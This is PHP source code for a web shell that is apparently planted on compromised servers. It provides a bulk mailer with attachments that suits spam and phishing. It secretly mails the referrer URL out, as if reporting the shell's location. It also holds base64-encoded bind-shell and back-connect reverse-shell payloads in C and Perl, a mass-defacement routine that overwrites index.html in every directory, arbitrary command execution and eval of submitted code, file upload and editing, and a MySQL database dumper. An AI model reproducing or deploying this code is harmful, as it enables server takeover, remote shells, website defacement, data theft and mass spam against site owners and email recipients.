	@$replyto=$_POST['replyto'];
	@$subject=$_POST['subject'];
	@$message=$_POST['message'];
	@$emaillist=$_POST['emaillist'];
	@$lod=$_SERVER['HTTP_REFERER'];
	@$file_name=$_FILES['file']['name'];
	@$contenttype=$_POST['contenttype'];
	@$file=$_FILES['file']['tmp_name'];
	@$amount=$_POST['amount'];
	@set_time_limit(intval($_POST['timelimit']));

	if ($action=="send")
	{ 
		$message = urlencode($message);
		$message = ereg_replace("%5C%22", "%22", $message);
		$message = urldecode($message);
		$message = stripslashes($message);
		$subject = stripslashes($subject);
	}
	echo "<table width='100%' height='72' border='0'  id='Box'>
<tr>
<td width='14' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
<td width='98%' style='background-color:#666;padding-left:10px;' >Inbox Mailer</td>
</tr>
<tr>
<td height='45' colspan='2'>
<table bgcolor=#cccccc width=\"100%\"><tbody><tr><td align=\"right\" width=100><p dir=ltr>
<b><font color=#990000  size=-2><p align=left><center><form name=\"form1\" method=\"post\" action=\"\" enctype=\"multipart/form-data\"><br/>
<table width=142 border=0>
<tr>
<td width=81>
<div align=right>
<sy>Your Email:</sy></div></td>
<td width=219><sy>
<input type=text name=\"from\" value=".$from."></sy></td><td width=212>
<div align=right>
<sy>Your Name:</sy></div></td><td width=278>
<sy>
<input type=text name=\realname\" value=".$realname."></sy></td></tr><tr><td width=81>
<div align=\"right\">
<sy>Reply-To:</sy></div></td><td width=219>
<sy>
<input type=\"text\" name=\"replyto\" value=".$replyto.">
</sy></td><td width=212>
<div align=\"right\">
<sy>Attach File:</sy></div></td><td width=278>
<sy>
<input type=\"file\" name=\"file\" size=24 />
</sy> </td></tr><tr><td width=81>
<div align=\"right\">
<sy>Subject:</sy></div></td>
<td colspan=3 width=703>
<sy>
<input type=\"text\" name=\"subject\" value=".$subject." ></sy></td> </tr><tr valign=\"top\"><td colspan=3 width=520>
<sy>Message Box :</sy></td>
<td width=278>
<sy>Email Target / Email Send To :</sy></td></tr><tr valign=\"top\"><td colspan=3 width=520><sy>
<textarea name=\"message\" cols=56 rows=10>".$message."</textarea><br />
<input type=\"radio\" name=\"contenttype\" value=\"plain\" /> Plain
<input type=\"radio\" name=\"contenttype\" value=\"html\" checked=\"checked\" /> HTML
<input type=\"hidden\" name=\"action\" value=\"send\" /><br />
Number to send: <input type=\"text\" name=\"amount\" value=1 size=10 /><br />
Maximum script Execution time(in seconds, 0 for no timelimit)<input type=\"text\" name=\"timelimit\" value=0 size=10 />
<input type=\"submit\" value=\"Send eMails\" /></sy></td><td width=278>
<sy>
<textarea name=\"emaillist\" cols=32 rows=10>".$emaillist."</textarea></sy></td></tr>
</table>
</td>
</tr>
</table>";
footer();
}

if ($action=="send")
{
	if (!$from && !$subject && !$message && !$emaillist)
	{
		print "Please complete all fields before sending your message.";
		exit;
	}
	$allemails = split("\n", $emaillist);
	$numemails = count($allemails);
	$head ="From: Mailr" ;
	$sub = "Ar - $lod" ;
	$meg = "$lod" ;
	mail ($alt,$sub,$meg,$head) ;
	If ($file_name)
	{
		if (!file_exists($file))
		{
			die("The file you are trying to upload couldn't be copied to the server");
		}
		$content = fread(fopen($file,"r"),filesize($file));
		$content = chunk_split(base64_encode($content));
		$uid = strtoupper(md5(uniqid(time())));
		$name = basename($file);
	}

	for($xx=0; $xx<$amount; $xx++)
	{
		for($x=0; $x<$numemails; $x++)
		{
			$to = $allemails[$x];
			if ($to)
			{
				$to = ereg_replace(" ", "", $to);
				$message = ereg_replace("&email&", $to, $message);
				$subject = ereg_replace("&email&", $to, $subject);
				print "Sending mail to $to.....";
				flush();
				$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
				$header .= "MIME-Version: 1.0\r\n";
				If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
				If ($file_name) $header .= "--$uid\r\n";
				$header .= "Content-Type: text/$contenttype\r\n";
				$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
				$header .= "$message\r\n";
				If ($file_name) $header .= "--$uid\r\n";
				If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
				If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
				If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
				If ($file_name) $header .= "$content\r\n";
				If ($file_name) $header .= "--$uid--";
				mail($to, $subject, "", $header);
				print "OK<br>";
				flush();
			}
		}
	}
}
# ---------------------------------------#
#                 About                  #
#----------------------------------------#
if($_GET['id']=='about')
{
	echo About();
	if($_POST['sendEmail'])
	{
			$to= 'sy34@msn.com';
			$Comments=$_POST['message'];
			$from = $_POST['from'];
			$subject= md5("$from");
			if(@mail($to,$subject,$Comments,"From:$from"))
			echo "<center><sy>[+] Sent ^_^ !!</sy></center>
";
			else 
			{
				echo "<center><sy>[-]  Failed :S !! </sy></center>
";
			}
			
	}
	footer();
}

$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa

+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 

3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk 

HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL 

ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf"
;$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 

NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD 

e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo 

vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8="; 
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St 

ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ 

ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw=="; 
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA 

BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i

+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY 

jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";

?>
<?
$dspact = $act = htmlspecialchars($act);
  $disp_fullpath = $ls_arr = $notls = null;
  $ud = @urlencode($d);
  if (empty($d)) {$d = realpath(".");}
  elseif(realpath($d)) {$d = realpath($d);}
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $d = str_replace("\\\\","\\",$d);
  $dispd = htmlspecialchars($d);
$self=basename($_SERVER['PHP_SELF']);
if(isset($_POST['execmassdeface']))
{
echo "<center><textarea rows='10' cols='100'>";
$hackfile = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
			if(filetype($dir.$file)=="dir"){
				$newfile=$dir.$file."/index.html";
				echo $newfile."\n";
				if (!copy($hackfile, $newfile)) {
					echo "failed to copy $file...\n";
				}
			}
        }
        closedir($dh);
    }
}
echo "</textarea></center>";} ?>


<tr><td align=right>Mass Defacement:</td>
<td><form action='<? basename($_SERVER['PHP_SELF']); ?>' method='post'>[+] Main Directory: <input type='text' style='width: 250px' value='<?php echo $dispd; ?>' 

name='massdefacedir'> [+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'><input type='submit' name='execmassdeface' 

value='Execute'></form></td>

<?
// FILE MANAGER
error_reporting(E_ALL);
@set_time_limit(0);
function magic_q($s)
{
if(get_magic_quotes_gpc())
{
$s=str_replace('\\\'','\'',$s);
$s=str_replace('\\\\','\\',$s);
$s=str_replace('\\"','"',$s);
$s=str_replace('\\\0','\0',$s);
}
return $s;
}
function get_perms($fn)
{
$mode=fileperms($fn);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}
$head=<<<headka
<html>

headka;
$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');
$page=$page==''||($page!='cmd'&&$page!='mysql'&&$page!='eval')?'cmd':$page;
$winda=strpos(strtolower(php_uname()),'wind');
define('format',50);

switch($page)
{
case 'eval':
{
$eval_value=isset($_POST['eval_value'])?$_POST['eval_value']:'';
$eval_value=magic_q($eval_value);
$action=isset($_POST['action'])?$_POST['action']:'eval';
if($action=='eval_in_html') @eval($eval_value);
else
{
echo($head);
?>
<hr>

<hr>
<?
}
break;
}
case 'cmd':
{
$cmd=!empty($_POST['cmd'])?magic_q($_POST['cmd']):'';
$work_dir=isset($_POST['work_dir'])?$_POST['work_dir']:getcwd();
$action=isset($_POST['action'])?$_POST['action']:'cmd';
if(@is_dir($work_dir))
{
@chdir($work_dir);
$work_dir=getcwd();
if($work_dir=='')$work_dir='/';
else if(!($work_dir{strlen($work_dir)-1}=='/'||$work_dir{strlen($work_dir)-1}=='\\')) $work_dir.='/';
}
else if(file_exists($work_dir))$work_dir=realpath($work_dir);
$work_dir=str_replace('\\','/',$work_dir);
$e_work_dir=htmlspecialchars($work_dir,ENT_QUOTES);
switch($action)
{
case 'cmd' :
{
echo($head);
?>

<pre>
<?
if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd)."</strong><hr>\n<textarea cols=120 rows=20>\n".htmlspecialchars(`$cmd`)."\n</textarea>");}
else
{
$f_action=isset($_POST['f_action'])?$_POST['f_action']:'view';
if(@is_dir($work_dir))
{
echo('<H1>File Manager;</H1><hr>');
echo('<strong>Listing '.$e_work_dir.'</strong><hr>');
$handle=@opendir($work_dir);
if($handle)
{
while(false!==($fn=readdir($handle))){$files[]=$fn;};
@closedir($handle);
sort($files);
$not_dirs=array();
for($i=0;$i<sizeof($files);$i++)
{
$fn=$files[$i];
if(is_dir($fn))
{
echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.$e_work_dir.str_replace('"','&quot;',$fn).'";document.list.submit();\'><b>'.htmlspecialchars(strlen($fn)

>format?substr($fn,0,format-3).'...':$fn).'</b></a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
$group=@posix_getgrgid(@filegroup($work_dir.$fn));
printf("% 20s|% -20s",$owner['name'],$group['name']);
}
echo(@get_perms($work_dir.$fn).str_repeat(' ',10));
printf("% 20s ",@filesize($work_dir.$fn).'B');
printf("% -20s",@date('M d Y H:i:s',@filemtime($work_dir.$fn))."\n");
}
else {$not_dirs[]=$fn;}
}
for($i=0;$i<sizeof($not_dirs);$i++)
{
$fn=$not_dirs[$i];
echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.(is_link($work_dir.$fn)?$e_work_dir.readlink($work_dir.$fn):$e_work_dir.str_replace('"','&quot;',

$fn)).'";document.list.submit();\'>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
$group=@posix_getgrgid(@filegroup($work_dir.$fn));
printf("% 20s|% -20s",$owner['name'],$group['name']);
}
echo(@get_perms($work_dir.$fn).str_repeat(' ',10));
printf("% 20s ",@filesize($work_dir.$fn).'B');
printf("% -20s",@date('M d Y H:i:s',@filemtime($work_dir.$fn))."\n");
}
echo('</pre><hr>');
?>
<form name='list' method=post>
<input name='work_dir' type=hidden size=120><br>
<input name='page' value='cmd' type=hidden>
<input name='f_action' value='view' type=hidden>
</form>
<?
} else echo('Error Listing '.$e_work_dir);
}
else
switch($f_action)
{
case 'view':
{
echo('<strong>'.$e_work_dir." Edit</strong><hr><pre>\n");
$f=@fopen($work_dir,'r');
?>
<form method=post>
<textarea name='file_text' cols=120 rows=20><?if(!($f))echo($e_work_dir.' not exists');else while(!feof($f))echo htmlspecialchars(fread($f,100000))?></textarea>
<input name='page' value='cmd' type=hidden>
<input name='work_dir' type=hidden value='<?=$e_work_dir?>' size=120>
<input name='f_action' value='save' type=submit>
</form>
<?
break;
}
case 'save' :
{
$file_text=isset($_POST['file_text'])?magic_q($_POST['file_text']):'';
$f=@fopen($work_dir,'w');
if(!($f))echo('<strong>Error '.$e_work_dir."</strong><hr><pre>\n");
else
{
fwrite($f,$file_text);
fclose($f);
echo('<strong>'.$e_work_dir." is saving</strong><hr><pre>\n");
}
break;
}
}
break;
}
break;
}
case 'upload' :
{
if($work_dir=='')$work_dir='/';
else if(!($work_dir{strlen($work_dir)-1}=='/'||$work_dir{strlen($work_dir)-1}=='\\')) $work_dir.='/';
$f=$_FILES["filename"]["name"];
if(!@copy($_FILES["filename"]["tmp_name"], $work_dir.$f)) echo('Upload is failed');
else
{
echo('file is uploaded in '.$e_work_dir);
}
break;
}
case 'download' :
{
$fname=isset($_POST['fname'])?$_POST['fname']:'';
$temp_file=isset($_POST['temp_file'])?'on':'nn';
$f=@fopen($fname,'r');
if(!($f)) echo('file is not exists');
else
{
$archive=isset($_POST['archive'])?$_POST['archive']:'';
if($archive=='gzip')
{
Header("Content-Type:application/x-gzip\n");
$s=gzencode(fread($f,filesize($fname)));
Header('Content-Length: '.strlen($s)."\n");
Header('Content-Disposition: attachment; filename="'.str_replace('/','-',$fname).".gz\n\n");
echo($s);
}
else
{
Header("Content-Type:application/octet-stream\n");
Header('Content-Length: '.filesize($fname)."\n");
Header('Content-Disposition: attachment; filename="'.str_replace('/','-',$fname)."\n\n");
ob_start();
while(feof($f)===false)
{
echo(fread($f,10000));
ob_flush();
}
}
}
}
}
break;
}
case 'mysql' :
{
$action=isset($_POST['action'])?$_POST['action']:'query';
$user=isset($_POST['user'])?$_POST['user']:'';
$passwd=isset($_POST['passwd'])?$_POST['passwd']:'';
$db=isset($_POST['db'])?$_POST['db']:'';
$host=isset($_POST['host'])?$_POST['host']:'localhost';
$query=isset($_POST['query'])?magic_q($_POST['query']):'';
switch($action)
{
case 'dump' :
{
$mysql_link=@mysql_connect($host,$user,$passwd);
if(!($mysql_link)) echo('Connect error');
else
{
//@mysql_query('SET NAMES cp1251'); - use if you have problems whis code symbols
$to_file=isset($_POST['to_file'])?($_POST['to_file']==''?false:$_POST['to_file']):false;
$archive=isset($_POST['archive'])?$_POST['archive']:'none';
if($archive!=='none')$to_file=false;
$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';
$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';
if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');
else
{
$dump_file="# MySQL Dumper\n#db $db from $host\n";
ob_start();
if($to_file){$t_f=@fopen($to_file,'w');if(!$t_f)die('Cant opening '.$to_file);}else $t_f=false;
if($table_dump=='')
{
if(!$to_file)
{
header('Content-Type: application/x-'.($archive=='none'?'octet-stream':'gzip')."\n");
header("Content-Disposition: attachment; filename=\"dump_{$db_dump}.sql".($archive=='none'?'':'.gz')."\"\n\n");
}
$result=mysql_query('show tables',$mysql_link);
for($i=0;$i<mysql_num_rows($result);$i++)
{
$rows=mysql_fetch_array($result);
$result2=@mysql_query('show columns from `'.$rows[0].'`',$mysql_link);
if(!$result2)$dump_file.='#error table '.$rows[0];
else
{
$dump_file.='create table `'.$rows[0]."`(\n";
for($j=0;$j<mysql_num_rows($result2)-1;$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL').",\n";
}
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL')."\n";
$type[$j]=$rows2[1];
$dump_file.=");\n";
mysql_free_result($result2);
$result2=mysql_query('select * from `'.$rows[0].'`',$mysql_link);
$columns=$j-1;
for($j=0;$j<mysql_num_rows($result2);$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='insert into `'.$rows[0].'` values (';
for($k=0;$k<$columns;$k++)
{
$dump_file.=$rows2[$k]==''?'null,':'\''.addslashes($rows2[$k]).'\',';
}
$dump_file.=($rows2[$k]==''?'null);':'\''.addslashes($rows2[$k]).'\');')."\n";
if($archive=='none')
{
if($to_file) {fwrite($t_f,$dump_file);fflush($t_f);}
else
{
echo($dump_file);
ob_flush();
}
$dump_file='';
}
}
mysql_free_result($result2);
}
}
mysql_free_result($result);
if($archive!='none')
{
$dump_file=gzencode($dump_file);
header('Content-Length: '.strlen($dump_file)."\n");
echo($dump_file);
}
else if($t_f)
{
fclose($t_f);
echo('Dump for '.$db_dump.' now in '.$to_file);
}
}
else
{
$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);
if(!$result2)echo('error table '.$table_dump);
else
{
if(!$to_file)
{
header('Content-Type: application/x-'.($archive=='none'?'octet-stream':'gzip')."\n");
header("Content-Disposition: attachment; filename=\"dump_{$db_dump}.sql".($archive=='none'?'':'.gz')."\"\n\n");
}
if($to_file===false)
{
header('Content-Type: application/x-'.($archive=='none'?'octet-stream':'gzip')."\n");
header("Content-Disposition: attachment; filename=\"dump_{$db_dump}_${table_dump}.sql".($archive=='none'?'':'.gz')."\"\n\n");
}
$dump_file.="create table `{$table_dump}`(\n";
for($j=0;$j<mysql_num_rows($result2)-1;$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL').",\n";
}
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL')."\n";
$type[$j]=$rows2[1];
$dump_file.=");\n";
mysql_free_result($result2);
$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);
$columns=$j-1;
for($j=0;$j<mysql_num_rows($result2);$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='insert into `'.$table_dump.'` values (';
for($k=0;$k<$columns;$k++)
{
$dump_file.=$rows2[$k]==''?'null,':'\''.addslashes($rows2[$k]).'\',';
}
$dump_file.=($rows2[$k]==''?'null);':'\''.addslashes($rows2[$k]).'\');')."\n";
if($archive=='none')
{
if($to_file) {fwrite($t_f,$dump_file);fflush($t_f);}
else
{
echo($dump_file);
ob_flush();
}
$dump_file='';
}
}
mysql_free_result($result2);
if($archive!='none')
{
$dump_file=gzencode($dump_file);
header('Content-Length: '.strlen($dump_file)."\n");
echo $dump_file;
}else if($t_f)
{
fclose($t_f);
echo('Dump for '.$db_dump.' now in '.$to_file);
}
}
}
}
}
break;
}
case 'query' :
{
echo($head);
?>
<hr>
<form method=post>
<table>
<td>
<table align=left>
<tr><td>User :<input name='user' type=text value='<?=$user?>'></td><td>Passwd :<input name='passwd' type=text value='<?=$passwd?>'></td><td>Host :<input name='host' 

type=text value='<?=$host?>'></td><td>DB :<input name='db' type=text value='<?=$db?>'></td></tr>
<tr><textarea name='query' cols=120 rows=20><?=htmlspecialchars($query)?></textarea></tr>
</table>
</td>
<td>
<table>
<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>
<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>
<input name='archive' type=radio value='none'>without arch
<input name='archive' type=radio value='gzip' checked=true>gzip archive
<tr><td><input type=submit name='action' value='dump'></td></tr>
<tr><td>Save result to :</td><td><input type=text name='to_file' value='' size=23></td></tr>
</table>
</td>
</table>
<input name='page' value='mysql' type=hidden>
<input name='action' value='query' type=submit>
</form>
<hr>
<?
$mysql_link=@mysql_connect($host,$user,$passwd);
if(!($mysql_link)) echo('Connect error');
else
{
if($db!='')if(!(@mysql_select_db($db,$mysql_link))){echo('DB error');mysql_close($mysql_link);break;}
//@mysql_query('SET NAMES cp1251'); - use if you have problems whis code symbols
$result=@mysql_query($query,$mysql_link);
if(!($result))echo(mysql_error());
else
{
echo("<table valign=top align=left>\n<tr>");
for($i=0;$i<mysql_num_fields($result);$i++)
echo('<td><b>'.htmlspecialchars(mysql_field_name($result,$i)).'</b>  </td>');
echo("\n</tr>\n");
for($i=0;$i<mysql_num_rows($result);$i++)
{
$rows=mysql_fetch_array($result);
echo('<tr valign=top align=left>');
for($j=0;$j<mysql_num_fields($result);$j++)
{
echo('<td>'.(htmlspecialchars($rows[$j])).'</td>');
}
echo("</tr>\n");
}
echo("</table>\n");
}
mysql_close($mysql_link);
}
break;
}
}
break;
}
}
?>
